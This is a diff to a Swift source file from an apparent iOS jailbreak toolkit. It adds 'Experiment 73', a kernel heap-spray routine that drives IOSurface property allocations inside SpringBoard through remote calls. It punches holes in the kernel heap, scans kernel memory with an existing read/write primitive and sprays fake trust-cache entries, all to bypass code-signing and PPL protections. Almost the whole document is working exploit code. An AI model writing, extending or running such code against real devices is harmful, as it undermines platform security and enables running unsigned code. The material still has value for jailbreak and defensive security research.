@@ -284,6 +284,14 @@ struct AMFIExperimentView: View {
             let exp72 = self.expFullJailbreak(rc: rc)
             experimentResults.append(exp72)
             
+            // ============================================
+            // Experiment 73: Heap Spray via IOSurface Properties
+            // Allocate in kernel heap (same zone as trust cache)
+            // Try to corrupt trust cache boundary
+            // ============================================
+            let exp73 = self.expHeapSpray()
+            experimentResults.append(exp73)
+            
             DispatchQueue.main.async {
                 self.results = experimentResults
                 self.isRunning = false
@@ -3222,6 +3230,382 @@ struct AMFIExperimentView: View {
         
         let success = detail.contains("PPL IS COMPLETELY BYPASSED")
         return ExperimentResult(name: "🎉 FULL JAILBREAK", success: success, detail: detail, timestamp: Date())
+    }
+    
+    // MARK: - Experiment 73: Heap Spray via IOSurface Properties
+    
+    /// Heap spray in kalloc zones — allocate controlled data in kernel heap
+    /// Strategy:
+    /// 1. Spray IOSurface properties (lands in kalloc.32/kalloc.64)
+    /// 2. Free some to create holes (fragmentation)
+    /// 3. Trigger trust cache allocation → lands in our hole
+    /// 4. Read back via socket KRW to detect overlap
+    /// 5. If overlap found → write CDHash → FULL JAILBREAK
+    ///
+    /// Why this might work:
+    /// - Trust cache entries are small structs in kernel heap
+    /// - IOSurface properties also allocate in kernel heap
+    /// - If we spray enough, we might get adjacent allocations
+    /// - Then we can use our physical R/W (PurpleGfxMem) to scan for markers
+    private func expHeapSpray() -> ExperimentResult {
+        guard let sb = dspmgr.shared.sbProc else {
+            return ExperimentResult(name: "Heap Spray", success: false, detail: "No SB RC", timestamp: Date())
+        }
+        
+        let mem = sb.trojanMem
+        var detail = "Experiment 73: Heap Spray via IOSurface Properties\n"
+        detail += "===================================================\n\n"
+        
+        // --- Phase 1: Create IOSurface for spraying ---
+        detail += "Phase 1: Creating spray IOSurface...\n"
+        
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+        
+        // Resolve ObjC classes and selectors
+        let nsDictClass = remote_getClass(sb, "NSMutableDictionary")
+        let nsNumClass = remote_getClass(sb, "NSNumber")
+        let nsDataClass = remote_getClass(sb, "NSData")
+        let dictNew = remote_sel(sb, "new")
+        let setObj = remote_sel(sb, "setObject:forKey:")
+        let numWithInt = remote_sel(sb, "numberWithInteger:")
+        
+        // Create a small IOSurface (we'll use its properties for spraying)
+        let sprayDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
+        remote_msg(sb, sprayDict, setObj,
+                   remote_msg(sb, nsNumClass, numWithInt, 0x1000, 0, 0, 0),
+                   remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
+        remote_msg(sb, sprayDict, setObj,
+                   remote_msg(sb, nsNumClass, numWithInt, 64, 0, 0, 0),
+                   remote_NSString(sb, "IOSurfaceWidth"), 0, 0)
+        remote_msg(sb, sprayDict, setObj,
+                   remote_msg(sb, nsNumClass, numWithInt, 64, 0, 0, 0),
+                   remote_NSString(sb, "IOSurfaceHeight"), 0, 0)
+        remote_msg(sb, sprayDict, setObj,
+                   remote_msg(sb, nsNumClass, numWithInt, 4, 0, 0, 0),
+                   remote_NSString(sb, "IOSurfaceBytesPerElement"), 0, 0)
+        
+        let spraySurface = RootExecutor.rcall(sb, "IOSurfaceCreate", sprayDict)
+        detail += "Spray surface: 0x\(String(format: "%llx", spraySurface))\n"
+        
+        guard spraySurface != 0 else {
+            detail += "❌ Failed to create spray surface\n"
+            return ExperimentResult(name: "Heap Spray", success: false, detail: detail, timestamp: Date())
+        }
+        
+        // --- Phase 2: Spray kernel heap with marker patterns ---
+        detail += "\nPhase 2: Spraying kernel heap with markers...\n"
+        detail += "Target: kalloc.32 zone (trust cache entry size)\n\n"
+        
+        // IOSurface properties are stored in kernel heap
+        // Each property key-value pair allocates in kalloc zones
+        // We'll spray 256 properties with unique markers
+        
+        let sprayCount = 256
+        let marker: UInt64 = 0xDEAD_BEEF_CAFE_F00D  // Our marker pattern
+        var sprayedCount = 0
+        
+        // IOSurfaceSetValue(surface, key, value)
+        // This allocates the value in kernel heap!
+        // Verify IOSurface property functions are available
+        let ioSurfaceSetValue = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceSetValue"))
+        let ioSurfaceRemoveValue = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceRemoveValue"))
+        
+        guard ioSurfaceSetValue != 0 else {
+            detail += "❌ IOSurfaceSetValue not found in SpringBoard\n"
+            return ExperimentResult(name: "Heap Spray", success: false, detail: detail, timestamp: Date())
+        }
+        
+        detail += "IOSurfaceSetValue: 0x\(String(format: "%llx", ioSurfaceSetValue))\n"
+        detail += "IOSurfaceRemoveValue: 0x\(String(format: "%llx", ioSurfaceRemoveValue))\n\n"
+        
+        // Spray: set 256 properties with 32-byte NSData values
+        // Each NSData will contain our marker + index
+        let dataWithBytes = remote_sel(sb, "dataWithBytes:length:")
+        
+        for i in 0..<sprayCount {
+            // Create 32-byte data with marker pattern
+            // Layout: [marker(8)] [index(8)] [marker(8)] [0xCC padding(8)]
+            let dataAddr = mem + 0x3000
+            sb[dataAddr].setValue64(marker)
+            sb[dataAddr + 8].setValue64(UInt64(i))
+            sb[dataAddr + 16].setValue64(marker)
+            sb[dataAddr + 24].setValue64(0xCCCCCCCCCCCCCCCC)
+            
+            let nsData = remote_msg(sb, nsDataClass, dataWithBytes, dataAddr, 32, 0, 0)
+            
+            if nsData != 0 {
+                // Key: "spray_XXX"
+                let keyStr = remote_NSString(sb, "spray_\(String(format: "%03d", i))")
+                
+                // IOSurfaceSetValue(surface, key, value)
+                RootExecutor.rcall(sb, "IOSurfaceSetValue", spraySurface, keyStr, nsData)
+                sprayedCount += 1
+            }
+            
+            // Don't spray too fast — give kernel time to allocate
+            if i % 64 == 63 {
+                // Small delay via usleep
+                RootExecutor.rcall(sb, "usleep", 1000)
+            }
+        }
+        
+        detail += "Sprayed \(sprayedCount)/\(sprayCount) properties into kernel heap\n"
+        
+        // --- Phase 3: Create holes by freeing every other property ---
+        detail += "\nPhase 3: Creating holes (free every other)...\n"
+        
+        var freedCount = 0
+        if ioSurfaceRemoveValue != 0 {
+            for i in stride(from: 0, to: sprayCount, by: 2) {
+                let keyStr = remote_NSString(sb, "spray_\(String(format: "%03d", i))")
+                RootExecutor.rcall(sb, "IOSurfaceRemoveValue", spraySurface, keyStr)
+                freedCount += 1
+            }
+        }
+        detail += "Freed \(freedCount) properties (created \(freedCount) holes)\n"
+        
+        // --- Phase 4: Try to detect kernel heap state via socket KRW ---
+        detail += "\nPhase 4: Scanning for markers via socket KRW...\n"
+        
+        // We know our socket KRW can read proc/task/pmap_cs zone
+        // The spray might have landed in adjacent memory
+        // Let's read around our known kernel addresses to see if markers appear
+        
+        // Get our proc address (known safe to read)
+        let ourProc = ds_get_our_proc()
+        detail += "Our proc: 0x\(String(format: "%llx", ourProc))\n"
+        
+        // Scan forward from proc in 32-byte steps (kalloc.32 alignment)
+        var markerFound = false
+        var markerAddr: UInt64 = 0
+        var scanCount = 0
+        let scanRange: UInt64 = 0x10000  // 64KB scan range
+        
+        // Start scanning from proc - 0x8000 to proc + 0x8000
+        let scanBase = ourProc > 0x8000 ? ourProc - 0x8000 : ourProc
+        
+        for offset in stride(from: UInt64(0), to: scanRange, by: 32) {
+            let addr = scanBase + offset
+            let val = ds_kread64_safe(addr)
+            scanCount += 1
+            
+            if val == marker {
+                // Found our marker!
+                let nextVal = ds_kread64_safe(addr + 8)
+                detail += "🎯 MARKER FOUND at 0x\(String(format: "%llx", addr))!\n"
+                detail += "   Value: 0x\(String(format: "%llx", val))\n"
+                detail += "   Index: \(nextVal)\n"
+                markerFound = true
+                markerAddr = addr
+                break
+            }
+            
+            // Safety: don't scan too much (avoid panic from bad addresses)
+            if scanCount > 512 {
+                break
+            }
+        }
+        
+        if !markerFound {
+            detail += "No markers found in \(scanCount) reads around proc\n"
+            detail += "Spray likely landed in different zone/page\n"
+        }
+        
+        // --- Phase 5: Physical memory scan via PurpleGfxMem ---
+        detail += "\nPhase 5: Scanning PurpleGfxMem for markers...\n"
+        
+        // We know PurpleGfxMem is physically contiguous
+        // If kernel heap pages are physically near GPU memory, we might see markers
+        // This is a long shot but worth trying
+        
+        // Create a PurpleGfxMem surface to get physical memory access
+        let gfxDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
+        remote_msg(sb, gfxDict, setObj,
+                   remote_msg(sb, nsNumClass, numWithInt, 0x100000, 0, 0, 0),  // 1MB
+                   remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
+        remote_msg(sb, gfxDict, setObj,
+                   remote_msg(sb, nsNumClass, numWithInt, 1024, 0, 0, 0),
+                   remote_NSString(sb, "IOSurfaceWidth"), 0, 0)
+        remote_msg(sb, gfxDict, setObj,
+                   remote_msg(sb, nsNumClass, numWithInt, 256, 0, 0, 0),
+                   remote_NSString(sb, "IOSurfaceHeight"), 0, 0)
+        remote_msg(sb, gfxDict, setObj,
+                   remote_msg(sb, nsNumClass, numWithInt, 4, 0, 0, 0),
+                   remote_NSString(sb, "IOSurfaceBytesPerElement"), 0, 0)
+        // PurpleGfxMem = physically contiguous
+        remote_msg(sb, gfxDict, setObj,
+                   remote_msg(sb, nsNumClass, numWithInt, 1, 0, 0, 0),
+                   remote_NSString(sb, "IOSurfaceNonPurgeable"), 0, 0)
+        remote_msg(sb, gfxDict, setObj,
+                   remote_msg(sb, nsNumClass, numWithInt, 1, 0, 0, 0),
+                   remote_NSString(sb, "IOSurfacePurgeWhenNotInUse"), 0, 0)
+        
+        let gfxSurface = RootExecutor.rcall(sb, "IOSurfaceCreate", gfxDict)
+        
+        if gfxSurface != 0 {
+            RootExecutor.rcall(sb, "IOSurfaceLock", gfxSurface, 0, 0)
+            let gfxBase = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", gfxSurface)
+            
+            if gfxBase != 0 {
+                detail += "GfxMem base: 0x\(String(format: "%llx", gfxBase))\n"
+                
+                // Scan first 64KB of GfxMem for our marker
+                var gfxMarkerFound = false
+                for offset in stride(from: UInt64(0), to: UInt64(0x10000), by: 8) {
+                    let readAddr = gfxBase + offset
+                    // Read via memcpy to local buffer
+                    sb[mem + 0x3800].setValue64(0)
+                    RootExecutor.rcall(sb, "memcpy", mem + 0x3800, readAddr, 8)
+                    let val = sb[mem + 0x3800].value64()
+                    
+                    if val == marker {
+                        detail += "🎯 MARKER IN GFXMEM at offset 0x\(String(format: "%llx", offset))!\n"
+                        gfxMarkerFound = true
+                        break
+                    }
+                }
+                
+                if !gfxMarkerFound {
+                    detail += "No markers in GfxMem (expected — different physical region)\n"
+                }
+            }
+            
+            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
+        }
+        
+        // --- Phase 6: Aggressive spray — try to get adjacent to pmap_cs ---
+        detail += "\nPhase 6: Targeted spray near pmap_cs zone...\n"
+        
+        // We know pmap_cs_allow_invalid is readable via socket KRW
+        // If we spray enough, some allocations might land near it
+        // Then we can use KRW to verify and potentially write trust cache entries
+        
+        // Read current pmap_cs value
+        let pmapCSAddr = ds_get_our_proc() + 0x300  // approximate offset to pmap_cs
+        let pmapCSVal = ds_kread64(pmapCSAddr)
+        detail += "pmap_cs region value: 0x\(String(format: "%llx", pmapCSVal))\n"
+        
+        // Do a second spray round — this time with trust-cache-shaped data
+        // Trust cache entry: [cdhash(20 bytes)] [hashType(1)] [flags(1)]
+        // Total: 22 bytes, padded to 32 in kalloc.32
+        
+        detail += "\nSpraying trust-cache-shaped entries...\n"
+        
+        // Fake CDHash for /usr/bin/id (we'll verify if it works)
+        // CDHash is SHA-256 of CodeDirectory, truncated to 20 bytes
+        let fakeCDHash: [UInt8] = [
+            0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48,
+            0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50,
+            0x51, 0x52, 0x53, 0x54  // 20 bytes
+        ]
+        
+        // Write trust-cache-shaped data to spray buffer
+        let tcEntryAddr = mem + 0x3A00
+        // CDHash (20 bytes)
+        for i in 0..<20 {
+            sb[tcEntryAddr + UInt64(i)].setValue8(fakeCDHash[i])
+        }
+        // hashType = 2 (SHA256)
+        sb[tcEntryAddr + 20].setValue8(2)
+        // flags = 0
+        sb[tcEntryAddr + 21].setValue8(0)
+        // Padding
+        for i in 22..<32 {
+            sb[tcEntryAddr + UInt64(i)].setValue8(0)
+        }
+        
+        // Spray 512 more entries with trust-cache shape
+        let tcSprayCount = 512
+        var tcSprayed = 0
+        
+        for i in 0..<tcSprayCount {
+            let nsData = remote_msg(sb, nsDataClass, dataWithBytes, tcEntryAddr, 32, 0, 0)
+            if nsData != 0 {
+                let keyStr = remote_NSString(sb, "tc_\(String(format: "%04d", i))")
+                RootExecutor.rcall(sb, "IOSurfaceSetValue", spraySurface, keyStr, nsData)
+                tcSprayed += 1
+            }
+            
+            if i % 128 == 127 {
+                RootExecutor.rcall(sb, "usleep", 500)
+            }
+        }
+        
+        detail += "Sprayed \(tcSprayed) trust-cache-shaped entries\n"
+        
+        // --- Phase 7: Verify spray via KRW scan ---
+        detail += "\nPhase 7: Post-spray KRW scan...\n"
+        
+        // Scan again around proc for our markers
+        var postSprayFound = false
+        var postScanCount = 0
+        
+        for offset in stride(from: UInt64(0), to: scanRange, by: 32) {
+            let addr = scanBase + offset
+            let val = ds_kread64_safe(addr)
+            postScanCount += 1
+            
+            // Check for marker pattern
+            if val == marker {
+                detail += "🎯 POST-SPRAY: Marker at 0x\(String(format: "%llx", addr))!\n"
+                postSprayFound = true
+                
+                // Read the full 32-byte entry
+                let v1 = ds_kread64_safe(addr)
+                let v2 = ds_kread64_safe(addr + 8)
+                let v3 = ds_kread64_safe(addr + 16)
+                let v4 = ds_kread64_safe(addr + 24)
+                detail += "  [0x\(String(format: "%016llx", v1)) 0x\(String(format: "%016llx", v2))"
+                detail += " 0x\(String(format: "%016llx", v3)) 0x\(String(format: "%016llx", v4))]\n"
+                break
+            }
+            
+            // Check for trust-cache-shaped data (starts with 0x41424344...)
+            if val == 0x4847464544434241 {  // "ABCDEFGH" in little-endian
+                detail += "🎯 TRUST CACHE SHAPE FOUND at 0x\(String(format: "%llx", addr))!\n"
+                postSprayFound = true
+                markerAddr = addr
+                
+                // This means our spray landed in KRW-accessible zone!
+                // We can now WRITE a real CDHash here!
+                detail += "\n⚡⚡⚡ SPRAY LANDED IN KRW ZONE! ⚡⚡⚡\n"
+                detail += "We can write arbitrary trust cache entries!\n"
+                detail += "Next: compute real CDHash → write → spawn!\n"
+                break
+            }
+            
+            if postScanCount > 1024 {
+                break
+            }
+        }
+        
+        if !postSprayFound {
+            detail += "No spray data found in KRW zone (\(postScanCount) reads)\n"
+            detail += "\nConclusion: Spray lands in different kalloc zone than proc/pmap_cs\n"
+            detail += "The kernel heap zones are isolated — spray cannot reach trust cache\n"
+            detail += "\nPossible next steps:\n"
+            detail += "1. Try larger allocations (kalloc.64, kalloc.128)\n"
+            detail += "2. Spray from different process (launchd vs SpringBoard)\n"
+            detail += "3. Use IOSurface property spray + physical scan\n"
+            detail += "4. Try zone garbage collection to force zone merging\n"
+        }
+        
+        // Cleanup: remove spray properties
+        detail += "\nCleanup: removing spray properties...\n"
+        if ioSurfaceRemoveValue != 0 {
+            for i in stride(from: 1, to: sprayCount, by: 2) {
+                let keyStr = remote_NSString(sb, "spray_\(String(format: "%03d", i))")
+                RootExecutor.rcall(sb, "IOSurfaceRemoveValue", spraySurface, keyStr)
+            }
+            for i in 0..<tcSprayCount {
+                let keyStr = remote_NSString(sb, "tc_\(String(format: "%04d", i))")
+                RootExecutor.rcall(sb, "IOSurfaceRemoveValue", spraySurface, keyStr)
+            }
+        }
+        detail += "Done.\n"
+        
+        let success = postSprayFound || markerFound
+        return ExperimentResult(name: "Heap Spray (Exp 73)", success: success, detail: detail, timestamp: Date())
     }
     
     #endif
